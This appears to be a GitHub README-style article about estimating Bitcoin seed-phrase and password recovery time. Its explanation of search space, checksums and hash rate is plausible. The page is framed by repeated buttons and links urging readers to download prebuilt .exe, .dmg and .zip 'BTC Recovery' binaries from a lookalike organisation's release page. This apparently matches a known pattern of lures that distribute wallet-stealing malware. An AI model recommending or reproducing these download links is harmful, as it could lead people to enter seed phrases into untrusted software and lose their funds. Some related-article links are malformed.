<div align="center">
<img src="assets/banner-article.png" alt="How the recovery odds calculator works">
</div>

# How the recovery odds calculator works

<p align="center">Download BTC Recovery for your platform, then run the search for this case on your own machine.</p>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

A recovery estimate is arithmetic, not a promise: the size of the space you have to search, divided by the rate your hardware can test it, with the checksum removing most of the obviously wrong candidates first. The calculator does that division; whether the answer is minutes or centuries depends on how much you know.

## You'll see this if

You want a number before committing an evening, and a number is only useful if you know what it measures.

| What you enter | What it measures | What it ignores |
|---|---|---|
| words missing and their positions | the combinatorial space of those positions | whether your candidate words are right |
| character classes and length | the space of a password pattern | whether the real password fits the pattern |
| a hash rate | work per second on your hardware | thermal throttling, other load |
| a checksum filter | how many candidates survive validation | whether the survivor is yours |

## Why it happens

Search cost is multiplicative. Each unknown word position multiplies the space by the size of the word list; each unknown character multiplies it by the size of the character set. Two missing words are not twice one missing word, they are thousands of times it, and three are thousands of times that again.

The checksum is the discount. In a standard phrase the final word encodes a value over the others, so only a small fraction of guessed combinations are valid at all  -  which is why one missing word is a coffee break and two is an evening. That discount applies to phrases, not to passwords: a password has no internal validation, so every candidate costs a full attempt.

Rate is the other half, and it is hardware rather than software. A CPU tests thousands of candidates a second against a slow wallet encryption; a GPU tests far more. That ratio is the difference between a week and an hour for the same space, which is why the same question gets different answers on different machines: [GPU acceleration setup](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-gpu-acceleration-setup.md).

Estimates compound in ways that surprise people. Two independent unknowns multiply rather than add, so "one missing word and an uncertain wallet type" is not one harder problem but a grid of them, each with its own space. Collapse the grid before estimating: settle the wallet type by testing candidates against a known address, then estimate the word search on its own. An estimate spanning two unknowns is a range, and a range is not a plan.

## Fix

Use the calculator to compare plans rather than to predict outcomes: same target, different assumptions, then choose the cheapest plan that could be true.

1. **Fix what you know before estimating.** Positions, word counts and character classes are inputs; guesses about them are not.
2. **Estimate the space from the tightest honest assumption**, then from the loosest. If both plans are finishable, start tight; if only the loose one contains the truth, you have learned something before spending a night: [Recover a seed phrase with 1-3 missing words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-missing-seed-words.md).
3. **Apply the checksum discount for phrases only.** Passwords do not get it: [BIP39 passphrase (25th word) recovery](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-bip39-passphrase-recovery.md).
4. **Measure your own rate once.** Run a small candidate list and read the reported rate  -  that number is yours, not a benchmark from a page.
5. **Divide, then sanity-check.** A result of seconds usually means the space was smaller than you thought; a result of years usually means a missing constraint, not a hopeless case.
6. **Download the current release from the GitHub releases page** and use its own progress output as the second opinion: [the current release](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1).
7. **Write the estimate down** with the assumptions, so a later run can be compared rather than re-argued.

## If that did not work

If the arithmetic says years and the wallet matters, the answer is a constraint rather than more compute: another word, a screenshot, a second backup, a remembered address that narrows the branch.

If the arithmetic says minutes and the run still finds nothing, the inputs are wrong  -  an address from another account, a wallet type mismatch, or a candidate rule that excludes the truth. That is a diagnosis, not a slower search: [A recovery run that finds nothing: what to check](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-recovery-failed-what-now.md).

And if the space is genuinely unbounded  -  a random passphrase, a phrase with six unknown words  -  no rate makes it finite. Recognising that early is the difference between an evening spent wisely and a month of electricity: [Can lost Bitcoin be recovered?](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/can-lost-bitcoin-be-recovered-by-btcrecover.md).

Treat every estimate as a dated note. Hardware changes, lists change, and the same question asked twice with different assumptions should produce a comparison rather than an argument, which only happens if the first answer was written down.

## Prevention

- Record enough context with each backup that a future estimate starts tight.
- Keep one machine dedicated to recovery work, so its rate is predictable.
- Test candidate rules on a wallet you can open before pointing them at one you cannot.
- Store the phrase so the number of unknowns stays at zero: [How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md).
- BTCRecover is actively maintained, and the current release is published on the GitHub releases page.

### Why does one extra word change the answer so much?

Because each unknown position multiplies the space by the size of the candidate list. Going from one missing word to two is not twice the work; it is thousands of times the work, and the estimate reflects that directly.

## FAQ

### How long does seed phrase recovery take?

It depends on unknown positions and hardware rate, and nothing else. One missing word from a standard phrase is typically minutes to hours on a CPU; two is hours to days; three is usually beyond a single machine.

### Is the estimate exact?

No. It estimates a search space, not a result: a fast estimate still finds nothing if the target address or the wallet type is wrong, and a slow one can finish early by luck.

### What makes the biggest difference to the estimate?

The number of unknown words or characters, by a wide margin. Hardware rate changes the answer by a factor; one more unknown multiplies it by thousands.

### Can I speed up a search without new hardware?

Yes, by narrowing the space: fix more positions, tighten character classes, or use a known address to validate candidates earlier. That is usually worth more than a faster machine.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [Recover a seed phrase with 1-3 missing words]([Recover a seed phrase with 1-3 missing words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-missing-seed-words.md))
- [Seed words in the wrong order]([Seed words in the wrong order](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/fix-seed-words-in-wrong-order-with-btcrecover.md))
- [BIP39 passphrase and the 25th word]([BIP39 passphrase (25th word) recovery](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-bip39-passphrase-recovery.md))
- [GPU acceleration setup]([GPU acceleration setup](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-gpu-acceleration-setup.md))
